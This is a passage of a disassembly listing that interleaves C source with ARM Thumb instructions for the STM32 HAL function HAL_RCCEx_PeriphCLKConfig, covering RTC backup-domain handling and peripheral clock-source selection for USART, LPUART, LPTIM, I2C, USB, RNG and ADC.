 80044f8:	2b00      	cmp	r3, #0
 80044fa:	f000 809e 	beq.w	800463a <HAL_RCCEx_PeriphCLKConfig+0x1ca>
  {
    FlagStatus       pwrclkchanged = RESET;
 80044fe:	2300      	movs	r3, #0
 8004500:	747b      	strb	r3, [r7, #17]

    /* Check for RTC Parameters used to output RTCCLK */
    assert_param(IS_RCC_RTCCLKSOURCE(PeriphClkInit->RTCClockSelection));

    /* Enable Power Clock */
    if(__HAL_RCC_PWR_IS_CLK_DISABLED() != 0U)
 8004502:	4b46      	ldr	r3, [pc, #280]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004504:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004506:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800450a:	2b00      	cmp	r3, #0
 800450c:	d101      	bne.n	8004512 <HAL_RCCEx_PeriphCLKConfig+0xa2>
 800450e:	2301      	movs	r3, #1
 8004510:	e000      	b.n	8004514 <HAL_RCCEx_PeriphCLKConfig+0xa4>
 8004512:	2300      	movs	r3, #0
 8004514:	2b00      	cmp	r3, #0
 8004516:	d00d      	beq.n	8004534 <HAL_RCCEx_PeriphCLKConfig+0xc4>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8004518:	4b40      	ldr	r3, [pc, #256]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800451a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800451c:	4a3f      	ldr	r2, [pc, #252]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800451e:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8004522:	6593      	str	r3, [r2, #88]	; 0x58
 8004524:	4b3d      	ldr	r3, [pc, #244]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004526:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004528:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 800452c:	60bb      	str	r3, [r7, #8]
 800452e:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8004530:	2301      	movs	r3, #1
 8004532:	747b      	strb	r3, [r7, #17]
    }

    /* Enable write access to Backup domain */
    SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8004534:	4b3a      	ldr	r3, [pc, #232]	; (8004620 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 8004536:	681b      	ldr	r3, [r3, #0]
 8004538:	4a39      	ldr	r2, [pc, #228]	; (8004620 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 800453a:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 800453e:	6013      	str	r3, [r2, #0]

    /* Wait for Backup domain Write protection disable */
    tickstart = HAL_GetTick();
 8004540:	f7fc fdda 	bl	80010f8 <HAL_GetTick>
 8004544:	60f8      	str	r0, [r7, #12]

    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 8004546:	e009      	b.n	800455c <HAL_RCCEx_PeriphCLKConfig+0xec>
    {
      if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8004548:	f7fc fdd6 	bl	80010f8 <HAL_GetTick>
 800454c:	4602      	mov	r2, r0
 800454e:	68fb      	ldr	r3, [r7, #12]
 8004550:	1ad3      	subs	r3, r2, r3
 8004552:	2b02      	cmp	r3, #2
 8004554:	d902      	bls.n	800455c <HAL_RCCEx_PeriphCLKConfig+0xec>
      {
        ret = HAL_TIMEOUT;
 8004556:	2303      	movs	r3, #3
 8004558:	74fb      	strb	r3, [r7, #19]
        break;
 800455a:	e005      	b.n	8004568 <HAL_RCCEx_PeriphCLKConfig+0xf8>
    while(READ_BIT(PWR->CR1, PWR_CR1_DBP) == 0U)
 800455c:	4b30      	ldr	r3, [pc, #192]	; (8004620 <HAL_RCCEx_PeriphCLKConfig+0x1b0>)
 800455e:	681b      	ldr	r3, [r3, #0]
 8004560:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004564:	2b00      	cmp	r3, #0
 8004566:	d0ef      	beq.n	8004548 <HAL_RCCEx_PeriphCLKConfig+0xd8>
      }
    }

    if(ret == HAL_OK)
 8004568:	7cfb      	ldrb	r3, [r7, #19]
 800456a:	2b00      	cmp	r3, #0
 800456c:	d15a      	bne.n	8004624 <HAL_RCCEx_PeriphCLKConfig+0x1b4>
    {
      /* Reset the Backup domain only if the RTC Clock source selection is modified from default */
      tmpregister = READ_BIT(RCC->BDCR, RCC_BDCR_RTCSEL);
 800456e:	4b2b      	ldr	r3, [pc, #172]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004570:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004574:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004578:	617b      	str	r3, [r7, #20]

      if((tmpregister != RCC_RTCCLKSOURCE_NONE) && (tmpregister != PeriphClkInit->RTCClockSelection))
 800457a:	697b      	ldr	r3, [r7, #20]
 800457c:	2b00      	cmp	r3, #0
 800457e:	d01e      	beq.n	80045be <HAL_RCCEx_PeriphCLKConfig+0x14e>
 8004580:	687b      	ldr	r3, [r7, #4]
 8004582:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 8004584:	697a      	ldr	r2, [r7, #20]
 8004586:	429a      	cmp	r2, r3
 8004588:	d019      	beq.n	80045be <HAL_RCCEx_PeriphCLKConfig+0x14e>
      {
        /* Store the content of BDCR register before the reset of Backup Domain */
        tmpregister = READ_BIT(RCC->BDCR, ~(RCC_BDCR_RTCSEL));
 800458a:	4b24      	ldr	r3, [pc, #144]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800458c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004590:	f423 7340 	bic.w	r3, r3, #768	; 0x300
 8004594:	617b      	str	r3, [r7, #20]
        /* RTC Clock selection can be changed only if the Backup Domain is reset */
        __HAL_RCC_BACKUPRESET_FORCE();
 8004596:	4b21      	ldr	r3, [pc, #132]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 8004598:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800459c:	4a1f      	ldr	r2, [pc, #124]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800459e:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 80045a2:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        __HAL_RCC_BACKUPRESET_RELEASE();
 80045a6:	4b1d      	ldr	r3, [pc, #116]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045a8:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80045ac:	4a1b      	ldr	r2, [pc, #108]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045ae:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 80045b2:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
        /* Restore the Content of BDCR register */
        RCC->BDCR = tmpregister;
 80045b6:	4a19      	ldr	r2, [pc, #100]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045b8:	697b      	ldr	r3, [r7, #20]
 80045ba:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
      }

      /* Wait for LSE reactivation if LSE was enable prior to Backup Domain reset */
      if (HAL_IS_BIT_SET(tmpregister, RCC_BDCR_LSEON))
 80045be:	697b      	ldr	r3, [r7, #20]
 80045c0:	f003 0301 	and.w	r3, r3, #1
 80045c4:	2b00      	cmp	r3, #0
 80045c6:	d016      	beq.n	80045f6 <HAL_RCCEx_PeriphCLKConfig+0x186>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 80045c8:	f7fc fd96 	bl	80010f8 <HAL_GetTick>
 80045cc:	60f8      	str	r0, [r7, #12]

        /* Wait till LSE is ready */
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 80045ce:	e00b      	b.n	80045e8 <HAL_RCCEx_PeriphCLKConfig+0x178>
        {
          if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 80045d0:	f7fc fd92 	bl	80010f8 <HAL_GetTick>
 80045d4:	4602      	mov	r2, r0
 80045d6:	68fb      	ldr	r3, [r7, #12]
 80045d8:	1ad3      	subs	r3, r2, r3
 80045da:	f241 3288 	movw	r2, #5000	; 0x1388
 80045de:	4293      	cmp	r3, r2
 80045e0:	d902      	bls.n	80045e8 <HAL_RCCEx_PeriphCLKConfig+0x178>
          {
            ret = HAL_TIMEOUT;
 80045e2:	2303      	movs	r3, #3
 80045e4:	74fb      	strb	r3, [r7, #19]
            break;
 80045e6:	e006      	b.n	80045f6 <HAL_RCCEx_PeriphCLKConfig+0x186>
        while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 80045e8:	4b0c      	ldr	r3, [pc, #48]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045ea:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 80045ee:	f003 0302 	and.w	r3, r3, #2
 80045f2:	2b00      	cmp	r3, #0
 80045f4:	d0ec      	beq.n	80045d0 <HAL_RCCEx_PeriphCLKConfig+0x160>
          }
        }
      }

      if(ret == HAL_OK)
 80045f6:	7cfb      	ldrb	r3, [r7, #19]
 80045f8:	2b00      	cmp	r3, #0
 80045fa:	d10b      	bne.n	8004614 <HAL_RCCEx_PeriphCLKConfig+0x1a4>
      {
        /* Apply new RTC clock source selection */
        __HAL_RCC_RTC_CONFIG(PeriphClkInit->RTCClockSelection);
 80045fc:	4b07      	ldr	r3, [pc, #28]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 80045fe:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004602:	f423 7240 	bic.w	r2, r3, #768	; 0x300
 8004606:	687b      	ldr	r3, [r7, #4]
 8004608:	6d1b      	ldr	r3, [r3, #80]	; 0x50
 800460a:	4904      	ldr	r1, [pc, #16]	; (800461c <HAL_RCCEx_PeriphCLKConfig+0x1ac>)
 800460c:	4313      	orrs	r3, r2
 800460e:	f8c1 3090 	str.w	r3, [r1, #144]	; 0x90
 8004612:	e009      	b.n	8004628 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
      }
      else
      {
        /* set overall return value */
        status = ret;
 8004614:	7cfb      	ldrb	r3, [r7, #19]
 8004616:	74bb      	strb	r3, [r7, #18]
 8004618:	e006      	b.n	8004628 <HAL_RCCEx_PeriphCLKConfig+0x1b8>
 800461a:	bf00      	nop
 800461c:	40021000 	.word	0x40021000
 8004620:	40007000 	.word	0x40007000
      }
    }
    else
    {
      /* set overall return value */
      status = ret;
 8004624:	7cfb      	ldrb	r3, [r7, #19]
 8004626:	74bb      	strb	r3, [r7, #18]
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8004628:	7c7b      	ldrb	r3, [r7, #17]
 800462a:	2b01      	cmp	r3, #1
 800462c:	d105      	bne.n	800463a <HAL_RCCEx_PeriphCLKConfig+0x1ca>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 800462e:	4b8a      	ldr	r3, [pc, #552]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004630:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004632:	4a89      	ldr	r2, [pc, #548]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004634:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004638:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }

  /*-------------------------- USART1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART1) == RCC_PERIPHCLK_USART1)
 800463a:	687b      	ldr	r3, [r7, #4]
 800463c:	681b      	ldr	r3, [r3, #0]
 800463e:	f003 0301 	and.w	r3, r3, #1
 8004642:	2b00      	cmp	r3, #0
 8004644:	d00a      	beq.n	800465c <HAL_RCCEx_PeriphCLKConfig+0x1ec>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART1CLKSOURCE(PeriphClkInit->Usart1ClockSelection));

    /* Configure the USART1 clock source */
    __HAL_RCC_USART1_CONFIG(PeriphClkInit->Usart1ClockSelection);
 8004646:	4b84      	ldr	r3, [pc, #528]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004648:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800464c:	f023 0203 	bic.w	r2, r3, #3
 8004650:	687b      	ldr	r3, [r7, #4]
 8004652:	6a1b      	ldr	r3, [r3, #32]
 8004654:	4980      	ldr	r1, [pc, #512]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004656:	4313      	orrs	r3, r2
 8004658:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- USART2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USART2) == RCC_PERIPHCLK_USART2)
 800465c:	687b      	ldr	r3, [r7, #4]
 800465e:	681b      	ldr	r3, [r3, #0]
 8004660:	f003 0302 	and.w	r3, r3, #2
 8004664:	2b00      	cmp	r3, #0
 8004666:	d00a      	beq.n	800467e <HAL_RCCEx_PeriphCLKConfig+0x20e>
  {
    /* Check the parameters */
    assert_param(IS_RCC_USART2CLKSOURCE(PeriphClkInit->Usart2ClockSelection));

    /* Configure the USART2 clock source */
    __HAL_RCC_USART2_CONFIG(PeriphClkInit->Usart2ClockSelection);
 8004668:	4b7b      	ldr	r3, [pc, #492]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800466a:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800466e:	f023 020c 	bic.w	r2, r3, #12
 8004672:	687b      	ldr	r3, [r7, #4]
 8004674:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004676:	4978      	ldr	r1, [pc, #480]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004678:	4313      	orrs	r3, r2
 800467a:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* UART5 */

  /*-------------------------- LPUART1 clock source configuration ------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPUART1) == RCC_PERIPHCLK_LPUART1)
 800467e:	687b      	ldr	r3, [r7, #4]
 8004680:	681b      	ldr	r3, [r3, #0]
 8004682:	f003 0320 	and.w	r3, r3, #32
 8004686:	2b00      	cmp	r3, #0
 8004688:	d00a      	beq.n	80046a0 <HAL_RCCEx_PeriphCLKConfig+0x230>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LPUART1CLKSOURCE(PeriphClkInit->Lpuart1ClockSelection));

    /* Configure the LPUART1 clock source */
    __HAL_RCC_LPUART1_CONFIG(PeriphClkInit->Lpuart1ClockSelection);
 800468a:	4b73      	ldr	r3, [pc, #460]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800468c:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004690:	f423 6240 	bic.w	r2, r3, #3072	; 0xc00
 8004694:	687b      	ldr	r3, [r7, #4]
 8004696:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004698:	496f      	ldr	r1, [pc, #444]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800469a:	4313      	orrs	r3, r2
 800469c:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM1) == (RCC_PERIPHCLK_LPTIM1))
 80046a0:	687b      	ldr	r3, [r7, #4]
 80046a2:	681b      	ldr	r3, [r3, #0]
 80046a4:	f403 7300 	and.w	r3, r3, #512	; 0x200
 80046a8:	2b00      	cmp	r3, #0
 80046aa:	d00a      	beq.n	80046c2 <HAL_RCCEx_PeriphCLKConfig+0x252>
  {
    assert_param(IS_RCC_LPTIM1CLK(PeriphClkInit->Lptim1ClockSelection));
    __HAL_RCC_LPTIM1_CONFIG(PeriphClkInit->Lptim1ClockSelection);
 80046ac:	4b6a      	ldr	r3, [pc, #424]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046ae:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80046b2:	f423 2240 	bic.w	r2, r3, #786432	; 0xc0000
 80046b6:	687b      	ldr	r3, [r7, #4]
 80046b8:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 80046ba:	4967      	ldr	r1, [pc, #412]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046bc:	4313      	orrs	r3, r2
 80046be:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- LPTIM2 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_LPTIM2) == (RCC_PERIPHCLK_LPTIM2))
 80046c2:	687b      	ldr	r3, [r7, #4]
 80046c4:	681b      	ldr	r3, [r3, #0]
 80046c6:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80046ca:	2b00      	cmp	r3, #0
 80046cc:	d00a      	beq.n	80046e4 <HAL_RCCEx_PeriphCLKConfig+0x274>
  {
    assert_param(IS_RCC_LPTIM2CLK(PeriphClkInit->Lptim2ClockSelection));
    __HAL_RCC_LPTIM2_CONFIG(PeriphClkInit->Lptim2ClockSelection);
 80046ce:	4b62      	ldr	r3, [pc, #392]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046d0:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80046d4:	f423 1240 	bic.w	r2, r3, #3145728	; 0x300000
 80046d8:	687b      	ldr	r3, [r7, #4]
 80046da:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 80046dc:	495e      	ldr	r1, [pc, #376]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046de:	4313      	orrs	r3, r2
 80046e0:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

  /*-------------------------- I2C1 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C1) == RCC_PERIPHCLK_I2C1)
 80046e4:	687b      	ldr	r3, [r7, #4]
 80046e6:	681b      	ldr	r3, [r3, #0]
 80046e8:	f003 0340 	and.w	r3, r3, #64	; 0x40
 80046ec:	2b00      	cmp	r3, #0
 80046ee:	d00a      	beq.n	8004706 <HAL_RCCEx_PeriphCLKConfig+0x296>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C1CLKSOURCE(PeriphClkInit->I2c1ClockSelection));

    /* Configure the I2C1 clock source */
    __HAL_RCC_I2C1_CONFIG(PeriphClkInit->I2c1ClockSelection);
 80046f0:	4b59      	ldr	r3, [pc, #356]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80046f2:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80046f6:	f423 5240 	bic.w	r2, r3, #12288	; 0x3000
 80046fa:	687b      	ldr	r3, [r7, #4]
 80046fc:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 80046fe:	4956      	ldr	r1, [pc, #344]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004700:	4313      	orrs	r3, r2
 8004702:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
  }

#endif /* I2C2 */

  /*-------------------------- I2C3 clock source configuration ---------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_I2C3) == RCC_PERIPHCLK_I2C3)
 8004706:	687b      	ldr	r3, [r7, #4]
 8004708:	681b      	ldr	r3, [r3, #0]
 800470a:	f403 7380 	and.w	r3, r3, #256	; 0x100
 800470e:	2b00      	cmp	r3, #0
 8004710:	d00a      	beq.n	8004728 <HAL_RCCEx_PeriphCLKConfig+0x2b8>
  {
    /* Check the parameters */
    assert_param(IS_RCC_I2C3CLKSOURCE(PeriphClkInit->I2c3ClockSelection));

    /* Configure the I2C3 clock source */
    __HAL_RCC_I2C3_CONFIG(PeriphClkInit->I2c3ClockSelection);
 8004712:	4b51      	ldr	r3, [pc, #324]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004714:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004718:	f423 3240 	bic.w	r2, r3, #196608	; 0x30000
 800471c:	687b      	ldr	r3, [r7, #4]
 800471e:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8004720:	494d      	ldr	r1, [pc, #308]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004722:	4313      	orrs	r3, r2
 8004724:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
#endif /* I2C4 */

#if defined(USB_OTG_FS) || defined(USB)

  /*-------------------------- USB clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_USB) == (RCC_PERIPHCLK_USB))
 8004728:	687b      	ldr	r3, [r7, #4]
 800472a:	681b      	ldr	r3, [r3, #0]
 800472c:	f403 5300 	and.w	r3, r3, #8192	; 0x2000
 8004730:	2b00      	cmp	r3, #0
 8004732:	d028      	beq.n	8004786 <HAL_RCCEx_PeriphCLKConfig+0x316>
  {
    assert_param(IS_RCC_USBCLKSOURCE(PeriphClkInit->UsbClockSelection));
    __HAL_RCC_USB_CONFIG(PeriphClkInit->UsbClockSelection);
 8004734:	4b48      	ldr	r3, [pc, #288]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004736:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 800473a:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 800473e:	687b      	ldr	r3, [r7, #4]
 8004740:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004742:	4945      	ldr	r1, [pc, #276]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004744:	4313      	orrs	r3, r2
 8004746:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLL)
 800474a:	687b      	ldr	r3, [r7, #4]
 800474c:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 800474e:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 8004752:	d106      	bne.n	8004762 <HAL_RCCEx_PeriphCLKConfig+0x2f2>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 8004754:	4b40      	ldr	r3, [pc, #256]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004756:	68db      	ldr	r3, [r3, #12]
 8004758:	4a3f      	ldr	r2, [pc, #252]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800475a:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 800475e:	60d3      	str	r3, [r2, #12]
 8004760:	e011      	b.n	8004786 <HAL_RCCEx_PeriphCLKConfig+0x316>
    }
    else
    {
#if defined(RCC_PLLSAI1_SUPPORT)
      if(PeriphClkInit->UsbClockSelection == RCC_USBCLKSOURCE_PLLSAI1)
 8004762:	687b      	ldr	r3, [r7, #4]
 8004764:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004766:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 800476a:	d10c      	bne.n	8004786 <HAL_RCCEx_PeriphCLKConfig+0x316>
      {
        /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
        ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 800476c:	687b      	ldr	r3, [r7, #4]
 800476e:	3304      	adds	r3, #4
 8004770:	2101      	movs	r1, #1
 8004772:	4618      	mov	r0, r3
 8004774:	f000 f882 	bl	800487c <RCCEx_PLLSAI1_Config>
 8004778:	4603      	mov	r3, r0
 800477a:	74fb      	strb	r3, [r7, #19]

        if(ret != HAL_OK)
 800477c:	7cfb      	ldrb	r3, [r7, #19]
 800477e:	2b00      	cmp	r3, #0
 8004780:	d001      	beq.n	8004786 <HAL_RCCEx_PeriphCLKConfig+0x316>
        {
          /* set overall return value */
          status = ret;
 8004782:	7cfb      	ldrb	r3, [r7, #19]
 8004784:	74bb      	strb	r3, [r7, #18]
  }

#endif /* SDMMC1 */

  /*-------------------------- RNG clock source configuration ----------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_RNG) == (RCC_PERIPHCLK_RNG))
 8004786:	687b      	ldr	r3, [r7, #4]
 8004788:	681b      	ldr	r3, [r3, #0]
 800478a:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 800478e:	2b00      	cmp	r3, #0
 8004790:	d028      	beq.n	80047e4 <HAL_RCCEx_PeriphCLKConfig+0x374>
  {
    assert_param(IS_RCC_RNGCLKSOURCE(PeriphClkInit->RngClockSelection));
    __HAL_RCC_RNG_CONFIG(PeriphClkInit->RngClockSelection);
 8004792:	4b31      	ldr	r3, [pc, #196]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004794:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004798:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 800479c:	687b      	ldr	r3, [r7, #4]
 800479e:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 80047a0:	492d      	ldr	r1, [pc, #180]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047a2:	4313      	orrs	r3, r2
 80047a4:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLL)
 80047a8:	687b      	ldr	r3, [r7, #4]
 80047aa:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 80047ac:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 80047b0:	d106      	bne.n	80047c0 <HAL_RCCEx_PeriphCLKConfig+0x350>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 80047b2:	4b29      	ldr	r3, [pc, #164]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047b4:	68db      	ldr	r3, [r3, #12]
 80047b6:	4a28      	ldr	r2, [pc, #160]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047b8:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 80047bc:	60d3      	str	r3, [r2, #12]
 80047be:	e011      	b.n	80047e4 <HAL_RCCEx_PeriphCLKConfig+0x374>
    }
#if defined(RCC_PLLSAI1_SUPPORT)
    else if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLLSAI1)
 80047c0:	687b      	ldr	r3, [r7, #4]
 80047c2:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 80047c4:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 80047c8:	d10c      	bne.n	80047e4 <HAL_RCCEx_PeriphCLKConfig+0x374>
    {
      /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 80047ca:	687b      	ldr	r3, [r7, #4]
 80047cc:	3304      	adds	r3, #4
 80047ce:	2101      	movs	r1, #1
 80047d0:	4618      	mov	r0, r3
 80047d2:	f000 f853 	bl	800487c <RCCEx_PLLSAI1_Config>
 80047d6:	4603      	mov	r3, r0
 80047d8:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 80047da:	7cfb      	ldrb	r3, [r7, #19]
 80047dc:	2b00      	cmp	r3, #0
 80047de:	d001      	beq.n	80047e4 <HAL_RCCEx_PeriphCLKConfig+0x374>
      {
        /* set overall return value */
        status = ret;
 80047e0:	7cfb      	ldrb	r3, [r7, #19]
 80047e2:	74bb      	strb	r3, [r7, #18]
    }
  }

  /*-------------------------- ADC clock source configuration ----------------------*/
#if !defined(STM32L412xx) && !defined(STM32L422xx)
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_ADC) == RCC_PERIPHCLK_ADC)
 80047e4:	687b      	ldr	r3, [r7, #4]
 80047e6:	681b      	ldr	r3, [r3, #0]
 80047e8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80047ec:	2b00      	cmp	r3, #0
 80047ee:	d01c      	beq.n	800482a <HAL_RCCEx_PeriphCLKConfig+0x3ba>
  {
    /* Check the parameters */
    assert_param(IS_RCC_ADCCLKSOURCE(PeriphClkInit->AdcClockSelection));

    /* Configure the ADC interface clock source */
    __HAL_RCC_ADC_CONFIG(PeriphClkInit->AdcClockSelection);
 80047f0:	4b19      	ldr	r3, [pc, #100]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80047f2:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80047f6:	f023 5240 	bic.w	r2, r3, #805306368	; 0x30000000
 80047fa:	687b      	ldr	r3, [r7, #4]
 80047fc:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 80047fe:	4916      	ldr	r1, [pc, #88]	; (8004858 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004800:	4313      	orrs	r3, r2
 8004802:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

#if defined(RCC_PLLSAI1_SUPPORT)
